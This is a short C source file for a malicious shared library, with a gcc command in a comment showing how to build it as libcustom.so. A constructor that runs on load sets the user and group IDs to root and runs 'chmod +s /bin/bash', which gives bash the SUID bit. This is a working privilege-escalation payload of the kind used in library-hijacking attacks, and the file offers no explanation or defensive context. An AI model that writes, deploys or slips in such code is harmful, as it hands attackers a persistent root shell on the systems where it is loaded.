//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("chmod +s /bin/bash");
}
